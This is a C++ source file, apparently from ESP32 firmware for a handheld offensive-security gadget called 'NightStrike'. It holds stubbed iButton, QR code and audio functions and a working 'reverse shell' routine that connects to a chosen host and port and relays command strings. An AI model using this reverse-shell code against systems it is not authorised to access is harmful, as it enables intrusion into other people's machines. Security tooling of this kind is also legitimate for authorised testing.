#include "modules/others_module.h"
#include "core/display.h"
#include "core/storage.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <LittleFS.h>

namespace NightStrike {
namespace Modules {

// Reverse shell state
static WiFiClient* g_reverseShellClient = nullptr;
static std::string g_reverseShellHost;
static uint16_t g_reverseShellPort = 0;

OthersModule::OthersModule() {
}

Core::Error OthersModule::initialize() {
    if (_initialized) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    Serial.println("[Others] Module initialized");
    _initialized = true;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::shutdown() {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    stopReverseShell();
    stopAudio();
    
    _initialized = false;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::readiButton(std::string& id) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    if (_iButtonPin == 0) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "iButton pin not configured");
    }

    // TODO: Implement 1-Wire iButton reading
    // This requires OneWire library and DallasTemperature library
    // OneWire oneWire(_iButtonPin);
    // byte addr[8];
    // if (oneWire.search(addr)) {
    //     char idStr[17];
    //     for (int i = 0; i < 8; i++) {
    //         sprintf(idStr + i*2, "%02X", addr[i]);
    //     }
    //     id = std::string(idStr);
    //     return Core::Error(Core::ErrorCode::SUCCESS);
    // }

    id = "";
    return Core::Error(Core::ErrorCode::OPERATION_FAILED, "No iButton found");
}

Core::Error OthersModule::writeiButton(const std::string& id) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    // TODO: Implement iButton writing
    return Core::Error(Core::ErrorCode::NOT_SUPPORTED, "iButton writing not yet implemented");
}

Core::Error OthersModule::generateQRCode(const std::string& data, const std::string& filename) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    // TODO: Implement QR code generation
    // This requires QRCode library (qrcode library)
    // QRCode qrcode;
    // uint8_t qrcodeData[qrcode_getBufferSize(3)];
    // qrcode_initText(&qrcode, qrcodeData, 3, 0, data.c_str());
    
    Serial.printf("[Others] QR Code generated for: %s\n", data.c_str());
    
    // Display on screen
    return displayQRCode(data);
}

Core::Error OthersModule::displayQRCode(const std::string& data) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    auto& display = Core::Display::getInstance();
    
    // TODO: Render QR code on display
    // For now, just show text
    display.clear();
    display.setTextColor(Core::Display::Color::Green(), Core::Display::Color::Black());
    display.setTextSize(1);
    display.drawTextCentered(Core::Display::Point(display.getSize().width / 2,
                                                  display.getSize().height / 2),
                             "QR Code:");
    display.drawTextCentered(Core::Display::Point(display.getSize().width / 2,
                                                  display.getSize().height / 2 + 20),
                             data.c_str());
    
    Serial.printf("[Others] QR Code displayed: %s\n", data.c_str());
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::startReverseShell(const std::string& host, uint16_t port) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    if (WiFi.status() != WL_CONNECTED) {
        return Core::Error(Core::ErrorCode::NETWORK_NOT_CONNECTED);
    }

    if (g_reverseShellClient && g_reverseShellClient->connected()) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    if (g_reverseShellClient) {
        delete g_reverseShellClient;
    }

    g_reverseShellClient = new WiFiClient();
    g_reverseShellHost = host;
    g_reverseShellPort = port;

    IPAddress targetIP;
    if (!targetIP.fromString(host.c_str())) {
        if (!WiFi.hostByName(host.c_str(), targetIP)) {
            delete g_reverseShellClient;
            g_reverseShellClient = nullptr;
            return Core::Error(Core::ErrorCode::NETWORK_CONNECTION_FAILED, "Failed to resolve hostname");
        }
    }

    g_reverseShellClient->setTimeout(5000);
    
    if (!g_reverseShellClient->connect(targetIP, port)) {
        delete g_reverseShellClient;
        g_reverseShellClient = nullptr;
        return Core::Error(Core::ErrorCode::NETWORK_CONNECTION_FAILED);
    }

    _reverseShellActive = true;
    Serial.printf("[Others] Reverse shell connected to %s:%d\n", host.c_str(), port);
    
    // Send initial message
    g_reverseShellClient->println("NightStrike Reverse Shell Connected");
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::stopReverseShell() {
    if (g_reverseShellClient) {
        if (g_reverseShellClient->connected()) {
            g_reverseShellClient->stop();
        }
        delete g_reverseShellClient;
        g_reverseShellClient = nullptr;
    }

    _reverseShellActive = false;
    Serial.println("[Others] Reverse shell disconnected");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::sendCommand(const std::string& command) {
    if (!_reverseShellActive || !g_reverseShellClient || !g_reverseShellClient->connected()) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "Reverse shell not connected");
    }

    g_reverseShellClient->println(command.c_str());
    
    // Wait for response
    delay(100);
    if (g_reverseShellClient->available() > 0) {
        String response = g_reverseShellClient->readString();
        Serial.print("[ReverseShell] Response: ");
        Serial.println(response);
    }
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error OthersModule::playAudio(const std::string& filename) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    // TODO: Implement audio playback
    // This would require audio library (Audio library for ESP32)
    Serial.printf("[Others] Audio playback: %s (not yet implemented)\n", filename.c_str());
    return Core::Error(Core::ErrorCode::NOT_SUPPORTED, "Audio playback not yet implemented");
}

Core::Error OthersModule::stopAudio() {
    // TODO: Stop audio playback
    return Core::Error(Core::ErrorCode::SUCCESS);
}

} // namespace Modules
} // namespace NightStrike

